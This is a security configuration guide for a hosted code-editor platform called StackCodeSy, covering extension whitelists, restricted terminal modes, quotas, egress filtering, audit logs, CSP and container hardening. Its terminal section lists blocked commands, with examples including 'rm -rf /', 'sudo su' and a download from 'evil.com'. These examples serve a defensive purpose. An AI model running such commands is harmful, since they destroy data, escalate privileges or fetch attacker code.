# StackCodeSy Security Configuration Guide

Complete guide to configuring and deploying StackCodeSy with comprehensive security measures.

---

## Table of Contents

1. [Security Overview](#security-overview)
2. [Quick Start](#quick-start)
3. [Security Layers](#security-layers)
4. [Environment Variables](#environment-variables)
5. [Deployment Profiles](#deployment-profiles)
6. [Validation & Monitoring](#validation--monitoring)

---

## Security Overview

StackCodeSy implements **multi-layered security** controls:

```
┌─────────────────────────────────────────┐
│     Extension Marketplace Control      │  ← Whitelist approved extensions
├─────────────────────────────────────────┤
│       Terminal Security (3 modes)       │  ← Restricted shell with command filtering
├─────────────────────────────────────────┤
│      File System Security & Quotas      │  ← Disk quotas, file type blocking
├─────────────────────────────────────────┤
│    Network Security & Egress Filter     │  ← Domain whitelist, port filtering
├─────────────────────────────────────────┤
│       Comprehensive Audit Logging       │  ← All commands, file access, auth events
├─────────────────────────────────────────┤
│      Content Security Policy (CSP)      │  ← HTTP security headers
├─────────────────────────────────────────┤
│   Runtime Protection (AppArmor/Seccomp) │  ← Syscall filtering, capability restrictions
└─────────────────────────────────────────┘
```

---

## Quick Start

### Development Mode (No Security)

```bash
# Minimal security for local development
docker-compose -f docker-compose.dev.yml up
```

### Production Mode (Recommended Security)

```bash
# Maximum security for production
docker stack deploy \
  -c docker-compose.yml \
  -c docker-compose.prod-security.yml \
  stackcodesy
```

### Custom Security Profile

```bash
# Create .env file
cat > .env << 'EOF'
# Authentication
STACKCODESY_REQUIRE_AUTH=true
STACKCODESY_AUTH_API=https://your-api.com/auth

# Terminal - Restricted
STACKCODESY_TERMINAL_MODE=restricted
STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,git,python

# Extensions - Whitelist
STACKCODESY_EXTENSION_MODE=whitelist

# File System
STACKCODESY_DISK_QUOTA_MB=3000

# Audit Logging
STACKCODESY_ENABLE_AUDIT_LOG=true
EOF

# Deploy
docker stack deploy -c docker-compose.yml stackcodesy
```

---

## Security Layers

### 1. Extension Marketplace Security

**Purpose**: Control which VS Code extensions users can install

**Configuration**:

```bash
# Mode 1: Disabled (maximum security)
STACKCODESY_EXTENSION_MODE=disabled

# Mode 2: Whitelist (recommended for production)
STACKCODESY_EXTENSION_MODE=whitelist
STACKCODESY_EXTENSION_WHITELIST=ms-python.python,dbaeumer.vscode-eslint
# OR use file:
STACKCODESY_EXTENSION_WHITELIST_FILE=/stackcodesy/config/approved-extensions.txt

# Mode 3: Full (development only)
STACKCODESY_EXTENSION_MODE=full
```

**Approved Extensions File** (`config/approved-extensions.txt`):

```
# Language Support
ms-python.python
ms-python.vscode-pylance
golang.go
rust-lang.rust-analyzer

# Code Quality
dbaeumer.vscode-eslint
esbenp.prettier-vscode

# Version Control
eamodio.gitlens
```

**Benefits**:
- ✅ Prevent malicious extension installation
- ✅ Control feature set available to users
- ✅ Security team reviews all extensions
- ✅ Consistent development environment

---

### 2. Terminal Security

**Purpose**: Control terminal access and command execution

**Three Security Modes**:

| Mode | Description | Use Case |
|------|-------------|----------|
| **disabled** | No terminal access | Public platforms, untrusted users |
| **restricted** | Whitelist commands only | Build platforms, coding platforms |
| **full** | Complete bash access | Development, trusted users only |

**Restricted Mode Configuration**:

```bash
STACKCODESY_TERMINAL_MODE=restricted

# Workspace restriction
STACKCODESY_TERMINAL_WORKSPACE_ONLY=true
STACKCODESY_WORKSPACE_DIR=/workspace

# Allowed commands
STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,pnpm,node,git,python,make

# Blocked patterns
STACKCODESY_TERMINAL_BLOCKED_COMMANDS=rm -rf,dd,sudo,wget,curl,ssh

# Additional controls
STACKCODESY_TERMINAL_BLOCK_NETWORK=false
STACKCODESY_TERMINAL_MAX_COMMAND_LENGTH=1000
```

**What Users Can/Cannot Do**:

✅ **ALLOWED** (restricted mode):
```bash
npm install
yarn build
git commit -m "message"
python app.py
make test
```

❌ **BLOCKED** (restricted mode):
```bash
rm -rf /              # Dangerous command
sudo su               # Privilege escalation
wget evil.com/sh      # Network download
cd /etc               # Outside workspace
curl http://...       # Network access (if BLOCK_NETWORK=true)
```

---

### 3. File System Security

**Purpose**: Prevent disk abuse and malicious file uploads

**Configuration**:

```bash
# Disk quota (MB)
STACKCODESY_DISK_QUOTA_MB=5000

# Maximum file size (MB)
STACKCODESY_MAX_FILE_SIZE_MB=100

# Blocked file types
STACKCODESY_BLOCKED_FILE_TYPES=.exe,.dll,.msi,.bin

# File monitoring (inotify)
STACKCODESY_ENABLE_FILE_MONITORING=true

# Read-only directories
STACKCODESY_READONLY_DIRS=/etc,/usr,/lib
```

**Features**:
- Disk quota enforcement
- File size limits
- File type restrictions
- Real-time filesystem monitoring
- Read-only system directories

---

### 4. Network Security

**Purpose**: Control outbound network access

**Configuration**:

```bash
# Enable egress filtering (requires CAP_NET_ADMIN)
STACKCODESY_ENABLE_EGRESS_FILTER=true

# Block all outbound (except specified)
STACKCODESY_BLOCK_ALL_OUTBOUND=false

# Allowed ports
STACKCODESY_ALLOWED_PORTS=80,443,22,9418

# Allowed domains (supports wildcards)
STACKCODESY_ALLOWED_DOMAINS=github.com,*.npmjs.org,registry.yarnpkg.com,pypi.org

# DNS filtering
STACKCODESY_ENABLE_DNS_FILTER=true
```

**Note**: Egress filtering requires `CAP_NET_ADMIN` capability:

```yaml
# docker-compose.yml
services:
  stackcodesy:
    cap_add:
      - NET_ADMIN
```

---

### 5. Audit Logging

**Purpose**: Track all security-relevant events

**Configuration**:

```bash
# Enable audit logging
STACKCODESY_ENABLE_AUDIT_LOG=true

# Log directory
STACKCODESY_AUDIT_LOG_DIR=/var/log/stackcodesy

# Retention period
STACKCODESY_AUDIT_LOG_RETENTION_DAYS=90

# What to log
STACKCODESY_LOG_TERMINAL_COMMANDS=true
STACKCODESY_LOG_FILE_ACCESS=true
STACKCODESY_LOG_AUTH_EVENTS=true
```

**Log Categories**:

| Category | File | Contents |
|----------|------|----------|
| Terminal | `terminal/commands.log` | All executed commands |
| File Access | `file-access/operations.log` | File read/write/delete |
| Authentication | `auth/events.log` | Login, logout, failures |
| Security | `security/events.log` | Security violations |
| System | `system/events.log` | Startup, shutdown |

**Viewing Logs**:

```bash
# Summary
docker exec <container> /usr/local/bin/audit-summary.sh

# Real-time monitoring
docker exec <container> /usr/local/bin/monitor-audit.sh

# Specific category
docker exec <container> tail -f /var/log/stackcodesy/terminal/commands.log
```

---

### 6. Content Security Policy

**Purpose**: Protect against XSS and injection attacks

**Configuration**:

```bash
# Enable CSP
STACKCODESY_ENABLE_CSP=true

# Policy level: strict, moderate, relaxed
STACKCODESY_CSP_POLICY=moderate
```

**CSP Levels**:

| Level | Strictness | Use Case |
|-------|-----------|----------|
| **strict** | Very high | Maximum security, may break some features |
| **moderate** | Balanced | Recommended for production |
| **relaxed** | Low | Development mode |

**HTTP Security Headers Configured**:

- `Content-Security-Policy`
- `X-Frame-Options: SAMEORIGIN`
- `X-Content-Type-Options: nosniff`
- `X-XSS-Protection: 1; mode=block`
- `Referrer-Policy: strict-origin-when-cross-origin`
- `Permissions-Policy` (camera, microphone, etc.)

**Validation**:

```bash
# Test headers
./usr/local/bin/validate-security-headers.sh http://localhost:8080
```

---

### 7. Runtime Protection

**Purpose**: Syscall filtering and capability restrictions

**AppArmor Profile**:

```bash
# 1. Copy profile to host
sudo cp security/apparmor-profile.txt /etc/apparmor.d/stackcodesy

# 2. Load profile
sudo apparmor_parser -r /etc/apparmor.d/stackcodesy

# 3. Enable in docker-compose.yml
security_opt:
  - apparmor=stackcodesy
```

**Seccomp Profile**:

```bash
# Enable in docker-compose.yml
security_opt:
  - seccomp=./security/seccomp-profile.json
```

**Capability Restrictions**:

```yaml
# Drop all capabilities
cap_drop:
  - ALL

# Add only required ones
cap_add:
  - CHOWN
  - DAC_OVERRIDE
  - SETGID
  - SETUID
```

---

## Environment Variables

### Complete Variable Reference

| Variable | Default | Description |
|----------|---------|-------------|
| **Authentication** | | |
| `STACKCODESY_REQUIRE_AUTH` | `false` | Enable authentication |
| `STACKCODESY_AUTH_API` | - | Auth API endpoint |
| `STACKCODESY_USER_ID` | - | User ID (direct auth) |
| `STACKCODESY_USER_NAME` | - | User name (direct auth) |
| `STACKCODESY_USER_EMAIL` | - | User email (direct auth) |
| `STACKCODESY_AUTH_TOKEN` | - | Auth token (direct auth) |
| **Terminal** | | |
| `STACKCODESY_TERMINAL_MODE` | `full` | Terminal mode: disabled/restricted/full |
| `STACKCODESY_TERMINAL_WORKSPACE_ONLY` | `true` | Restrict to workspace |
| `STACKCODESY_WORKSPACE_DIR` | `/workspace` | Workspace directory |
| `STACKCODESY_TERMINAL_ALLOWED_COMMANDS` | (see env file) | Allowed commands (comma-separated) |
| `STACKCODESY_TERMINAL_BLOCKED_COMMANDS` | (see env file) | Blocked patterns (comma-separated) |
| `STACKCODESY_TERMINAL_BLOCK_NETWORK` | `false` | Block network commands |
| `STACKCODESY_TERMINAL_MAX_COMMAND_LENGTH` | `1000` | Max command length |
| **Extensions** | | |
| `STACKCODESY_EXTENSION_MODE` | `full` | Extension mode: disabled/whitelist/full |
| `STACKCODESY_EXTENSION_WHITELIST` | - | Approved extensions (comma-separated) |
| `STACKCODESY_EXTENSION_WHITELIST_FILE` | `/stackcodesy/config/approved-extensions.txt` | Whitelist file path |
| **File System** | | |
| `STACKCODESY_DISK_QUOTA_MB` | `5000` | Disk quota in MB |
| `STACKCODESY_MAX_FILE_SIZE_MB` | `100` | Max file size in MB |
| `STACKCODESY_BLOCKED_FILE_TYPES` | `.exe,.dll,.msi` | Blocked extensions |
| `STACKCODESY_ENABLE_FILE_MONITORING` | `false` | Enable inotify monitoring |
| `STACKCODESY_READONLY_DIRS` | - | Read-only directories |
| **Network** | | |
| `STACKCODESY_ENABLE_EGRESS_FILTER` | `false` | Enable egress filtering |
| `STACKCODESY_BLOCK_ALL_OUTBOUND` | `false` | Block all outbound traffic |
| `STACKCODESY_ALLOWED_PORTS` | `80,443` | Allowed outbound ports |
| `STACKCODESY_ALLOWED_DOMAINS` | - | Allowed domains |
| `STACKCODESY_ENABLE_DNS_FILTER` | `false` | Enable DNS filtering |
| **Audit Logging** | | |
| `STACKCODESY_ENABLE_AUDIT_LOG` | `true` | Enable audit logging |
| `STACKCODESY_AUDIT_LOG_DIR` | `/var/log/stackcodesy` | Log directory |
| `STACKCODESY_AUDIT_LOG_RETENTION_DAYS` | `30` | Log retention days |
| `STACKCODESY_LOG_TERMINAL_COMMANDS` | `true` | Log terminal commands |
| `STACKCODESY_LOG_FILE_ACCESS` | `false` | Log file operations |
| `STACKCODESY_LOG_AUTH_EVENTS` | `true` | Log auth events |
| **CSP** | | |
| `STACKCODESY_ENABLE_CSP` | `true` | Enable CSP headers |
| `STACKCODESY_CSP_POLICY` | `relaxed` | CSP level: strict/moderate/relaxed |

---

## Deployment Profiles

### Profile 1: Development (Minimal Security)

**Use Case**: Local testing, development

**File**: `docker-compose.dev.yml`

```bash
docker-compose -f docker-compose.dev.yml up
```

**Security Settings**:
- ❌ No authentication
- ✅ Full terminal access
- ✅ Full extension marketplace
- ❌ No audit logging
- ❌ No network filtering

---

### Profile 2: Balanced Production (Recommended)

**Use Case**: Production coding platforms

**File**: `docker-compose.prod-security.yml`

```bash
docker stack deploy \
  -c docker-compose.yml \
  -c docker-compose.prod-security.yml \
  stackcodesy
```

**Security Settings**:
- ✅ Authentication required
- ✅ Restricted terminal (whitelisted commands)
- ✅ Extension whitelist
- ✅ Disk quotas (3GB)
- ✅ Comprehensive audit logging
- ✅ Moderate CSP
- ✅ Capability restrictions

---

### Profile 3: Maximum Security

**Use Case**: Public platforms, untrusted users

**Configuration**:

```bash
cat > .env.production << 'EOF'
# Maximum security
STACKCODESY_REQUIRE_AUTH=true
STACKCODESY_TERMINAL_MODE=disabled
STACKCODESY_EXTENSION_MODE=disabled
STACKCODESY_DISK_QUOTA_MB=1000
STACKCODESY_ENABLE_EGRESS_FILTER=true
STACKCODESY_BLOCK_ALL_OUTBOUND=true
STACKCODESY_ENABLE_AUDIT_LOG=true
STACKCODESY_CSP_POLICY=strict
EOF

docker stack deploy -c docker-compose.yml stackcodesy
```

**Security Settings**:
- ✅ Authentication required
- ✅ Terminals disabled
- ✅ Extensions disabled
- ✅ Strict disk quota (1GB)
- ✅ All outbound traffic blocked
- ✅ Comprehensive audit logging
- ✅ Strict CSP
- ✅ Read-only filesystem

---

## Validation & Monitoring

### Security Scan

```bash
# Scan Docker image for vulnerabilities
./scripts/security-scan.sh stackcodesy:latest

# Output: trivy-report.json, security-report.txt
```

### Configuration Validation

```bash
# Inside container
/usr/local/bin/audit-summary.sh
/usr/local/bin/validate-security-headers.sh http://localhost:8080
```

### Real-time Monitoring

```bash
# Monitor audit logs
docker exec <container> /usr/local/bin/monitor-audit.sh

# Monitor network activity
docker exec <container> /usr/local/bin/monitor-network.sh

# Check disk quota
docker exec <container> /usr/local/bin/check-disk-quota.sh
```

### Health Checks

```bash
# Service status
docker service ps stackcodesy_stackcodesy

# Logs
docker service logs -f stackcodesy_stackcodesy

# Inside container logs
docker exec <container> tail -f /var/log/stackcodesy/security/events.log
```

---

## Troubleshooting

### Issue: Terminal commands blocked unexpectedly

**Solution**: Check allowed commands list

```bash
# View current configuration
docker exec <container> env | grep STACKCODESY_TERMINAL

# Add missing command
STACKCODESY_TERMINAL_ALLOWED_COMMANDS=npm,yarn,git,YOUR_COMMAND
```

### Issue: Extension won't install

**Solution**: Add to whitelist

```bash
# Check extension ID
# In VS Code: Extensions > ... > Copy Extension ID

# Add to whitelist file
echo "publisher.extension-name" >> config/approved-extensions.txt

# Rebuild image
docker-compose build
```

### Issue: Disk quota exceeded

**Solution**: Increase quota or clean workspace

```bash
# Increase quota
STACKCODESY_DISK_QUOTA_MB=10000

# Check current usage
docker exec <container> du -sh /workspace
```

---

## Additional Resources

- [SECURITY_REPORT.md](SECURITY_REPORT.md) - Comprehensive security analysis
- [ADDITIONAL_SECURITY.md](ADDITIONAL_SECURITY.md) - Advanced hardening
- [DOCKER_SWARM_DEPLOYMENT.md](DOCKER_SWARM_DEPLOYMENT.md) - Swarm deployment guide
- [STACKCODESY_INTEGRATION.md](STACKCODESY_INTEGRATION.md) - Integration guide

---

**For questions or security concerns, please review the security documentation or consult your security team.**
